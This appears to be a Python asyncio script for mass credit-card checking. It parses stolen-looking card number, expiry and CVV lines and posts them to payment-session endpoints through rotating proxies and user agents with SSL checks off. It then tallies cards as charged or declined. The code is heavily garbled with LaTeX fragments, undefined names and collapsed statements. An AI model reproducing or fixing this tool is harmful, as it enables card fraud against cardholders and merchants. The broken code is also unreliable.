import aiohttp
import asyncio
from typing import Dict

CHARGED_COUNT = 0

async def check_single_cc(session: aiohttp.ClientSession, card_data: str) -> str:
    global CHARGED_COUNT
    
   # Parse CC details  
   try:
       bin_num, exp_mth, exp_yr, cvv \textstyle _= \
           [x.strip() for x in card_data.split("|")]
       exp_yr_short \textstyle _= exp_yr[-2:]
   except Exception as e \textstyle _= \
       return f"{card_data}|Error parsing"

   headers \textstyle _=\{
       'User-Agent': random.choice([
           'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
           'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)',
           'Mozilla/5.0 (Linux; Android 13)'
       ]),
       'Content-Type': 'application/json',
       'Referer': 'https://checkout.example.com/',
       'Origin': 'https://secure.example.com'
   }

   payload \textstyle _=\{
      \quote amount \quote:\space integer{₹}\left( random.randint(₹){}, ₹)\right),
      \quote currency \quote:\space \$\$},
      \quote card[number]\quote:\space bin_num,
      \quote card[exp_month]\quote:\space exp_mth,
      \quote card[exp_year]\quote:\space exp_yr,
      \quote card[cvv]\quote:\space cvv   
   }

   site_used \(=\) random.choice(RAZOR_SITES)
   url \(=\) f"https://{site_used}/v1/payment\_sessions"

   proxy \(=\) get_random_proxy()

try:

resp $=$ await session.post(
url,

json=payload,

headers=headers,

proxy\(=$ proxy $,$ timeout=aiohttp.ClientTimeout(total$=$),

ssl=False

)

data $=$await resp.json(content\_type=None)$

if"error"in data or"data"in data:return"\{\}lDeclined".format(card\_data)$

else:$charged_count+=l$;

result$="{}\$\{$ charged $\}$". format(card\_data)$;

RESULT_LOG.append(result)$;

return result$

except Exception as e:

return "\{\}|Error|\{\}".format(card\_data,str(e))$\}

async def run_mass_check(cards : List[str]):global RESULT_LOG task\_semaphore=asyncio.Semaphore(MAX\_CONCURRENT_TASKS)tasks=[]for ccdatextin cards:asyncdefwrapped(c=ccdatat):asyncwithtask_semaphore:returnawaitchecksinglecc(client,c)$taskswithclientasclient:asyncio.gather(*tasks)returnResults$

